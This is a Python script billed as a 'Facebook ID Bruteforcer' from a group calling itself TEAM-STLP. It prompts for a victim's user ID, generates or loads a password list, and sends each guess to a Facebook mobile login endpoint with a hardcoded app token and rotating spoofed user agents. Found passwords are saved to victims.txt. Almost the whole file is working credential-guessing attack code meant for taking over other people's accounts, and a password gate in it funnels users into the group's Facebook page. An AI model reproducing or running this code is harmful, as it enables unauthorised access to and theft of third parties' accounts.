# yeah, Finally I became A Hacker [-_-]

import os, sys, time, random, json, requests, mechanize,datetime
from time import sleep
import requests, sys, os, random, time,json
uagent=["Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]", "[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]", "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]", "Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]", "Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]", "Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"]
def slow(t):
    for e in t + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        sleep(0.06)

lines="\033[1;34m═\033[1;37m"*50
def banner():
  os.system("clear")
  print("\n\n")
  os.system("figlet -f slant TEAM-STLP |lolcat")
  print(lines)
  print("""
   Tools Name   : \033[1;32mFacebook ID Bruteforcer\033[1;37m
   Tools Author : \033[1;32mTEAM-STLP\033[1;37m
   Github       : \033[1;32mgithub.com/STLP-TEAM\033[1;37m
   Facebook     : \033[1;32mSpamming & Termux Learning Point\033[1;37m
  """)
  print(lines)
  upass=input("\n   [•] Enter Tool's Password: ")
  if upass=="TEAM STLP" or upass == "Team Stlp" or upass == "team stlp" or upass == "Team STLP":
    slow("   [•] Password Correct")
    time.sleep(2)
    mbanner()
    pass
  else:
    print(lines)
    slow("   [•] Password Wrong")
    slow("   [•] Join On Our Group For Password")
    slow("   [•] Then Post For Password With Tool's SS")
    slow("   [•] Our Group: Spamming & Termux Learning Point")
    os.system("xdg-open https://facebook.com/groups/spamming.termux.learning.point/")
    print(lines)
    sys.exit()
  menu()
def mbanner():
  os.system("clear")
  print("\n\n")
  os.system("figlet -f slant TEAM-STLP |lolcat")
  print(lines)
  print("""
   Tools Name   : \033[1;32mFacebook ID Bruteforcer\033[1;37m
   Tools Author : \033[1;32mTEAM-STLP\033[1;37m
   Github       : \033[1;32mgithub.com/STLP-TEAM\033[1;37m
   Facebook     : \033[1;32mSpamming & Termux Learning Point\033[1;37m
  """)
def menu():
  print(lines)
  print("""                CHOOSE AN OPTION
  
   [1] Start Bruteforcing
   [2] Join Our Group
   [3] Like Our Page
   [4] Our More Tools
   [5] Delete Cache
   [6] Exit Tools""")
  choose()
def choose():
  a=input("\n\n   [>>>] Enter Your Option : ")
  if a=="1" or a=="01":
    os.system("xdg-open https://facebook.com/groups/spamming.termux.learning.point/")
    pass
  elif a=="2" or a=="02":
    os.system("xdg-open https://facebook.com/groups/spamming.termux.learning.point/")
    sys.exit()
  elif a=="3" or a=="03":
    os.system("xdg-open https://facebook.com/spamming.termux.learning.point/")
    sys.exit()
  elif a=="4" or a=="04":
    os.system("xdg-open https://github.com/STLP-TEAM?tab=repositories")
    sys.exit()
  elif a=="5" or a=="05":
    print(lines)
    slow("     [•] Pleaae Wait A Moment")
    slow("     [•] Trying To Removing All Cache....")
    os.system("touch .autopass && touch hacked.txt")
    time.sleep(2)
    os.system("rm .autopass && rm hacked.txt")
    slow("     [•] All Cache Removed Successfully")
    print(lines)
    sys.exit()
  elif a=="6" or a=="06":
    slow("\n   [•] Exit Successfully\n")
    sys.exit()
  else:
    slow("\n   [•] Wrong Value Entered")
    slow("   [•] Try Again\n")
    menu()
banner()
id=[]
print(lines)
victim = input("   [•] Enter Victim's UID: ")
print(lines)
passlist= input("   [•] Password List(Press Just Enter For Auto Pass): ")

if passlist == "" or passlist == " " or passlist=="  ":
  fil=".autopass"
  slow("\n   [•] Please Wait A Moment")
  slow("   [•] Trying To Generate Auto Password List")
  ii = 99999
  f = open(".autopass","w")
  while True:
	  ii += 1
	  f.write(str(ii)+"\n")
	  if ii==1000000:
		  break
  f.close()
  slow("   [•] Auto Password List Generated")
  print(lines)
  time.sleep(1)
  try:
    tt=open(fil,"r")
    ft=tt.readlines()
    total=len(ft)
    tt.close()
  except:
    slow("   [•] File Not Found")
    slow("   [•] Try Again")
    sys.exit()
else:
  fil=passlist
  try:
    tt=open(fil,"r")
    ft=tt.readlines()
    total=len(ft)
    tt.close()
  except:
    slow("   [•] File Not Found")
    slow("   [•] Try Again")
    sys.exit()
mbanner()
now= datetime.datetime.now()
rtime=now.strftime("%H:%M:%S")
print(lines)
print("   [•] Victim's UID: "+str(victim))
print('   [•] Total Passwords: '+str(total))
print("   [•] Trying From: "+fil)
print("   [•] Right Password Will Save In victims.txt")
print("   [•] Attacking Time: "+str(rtime))
print(lines)
slow("\n   Attack Starting.....\n")
time.sleep(2)
def crack_file():
  pasw=open(fil,"r")
  for i in range(int(total)):
    try:
      try:
        pw=pasw.readline()
        pw=pw.replace("\n","")
        nagent = random.choice(uagent)
        ses = requests.Session()
        headers = {
      					"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
      					"x-fb-sim-hni": str(random.randint(20000, 40000)), 
      					"x-fb-net-hni": str(random.randint(20000, 40000)), 
      					"x-fb-connection-qunisadty": "EXCELLENT",
      					"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
      					"user-agent": nagent, 
      					"content-type": "application/x-www-form-urlencoded", 
      					"x-fb-http-engine": "Liger"
      				}
        
        response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(victim)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
        #print(response.text)
        hnow= datetime.datetime.now()
        htime=hnow.strftime("%H:%M:%S")
        if "session_key" in response.text and "EAAA" in response.text:
      	  #tok= response.json()["access_token"]
      	  #print(response.text)
      	  print(lines)
      	  print("   [•] Password Found")
      	  print("   [•] Status: Successful")
      	  print("   [•] Uid: "+victim)
      	  print("   [•] Password: "+pw)
      	  save=open("victims.txt","a")
      	  save.write("Victim Found\nStatus: Successful\nUid: "+victim+"\nPassword: "+str(pw)+"\nAttacking Time: "+rtime+"\nHacked Time: "+htime+"\n\n")
      	  save.close()
      	  print(lines)
      	  break
        elif "www.facebook.com" in response.json()["error_msg"]:
      	  print(lines)
      	  print("   [•] Password Found")
      	  print("   [•] Status: Checkpoint")
      	  print("   [•] Uid: "+victim)
      	  print("   [•] Password: "+pw)
      	  save=open("victims.txt","a")
      	  save.write("Victim Found\nStatus: Checkpoint\nUid: "+victim+"\nPassword: "+str(pw)+"\nAttacking Time: "+rtime+"\nHacked Time: "+htime+"\n\n")
      	  save.close()
      	  print(lines)
      	  break
        else:
          print("\033[1;37m   ["+str(i)+"] Wrong Password:\033[1;31m "+str(pw)+"\033[1;37m")
          continue
      except requests.exceptions.RequestException:
        print("\n\033[1;37m   Failed\n   Check Your Network\033[1;37m\n")
    except:pass
  #print(lines)
  #print("   [•] Password Not Found")
  #print("   [•] Try Again With A Strong Password List")
  #print(lines)
crack_file()
"""
        print("Password Found")
        print("Status: Successful")
        print("Uid: "+victim)
        print("Password: "+pwd)
	reversed › Exotic Hridoy
"""
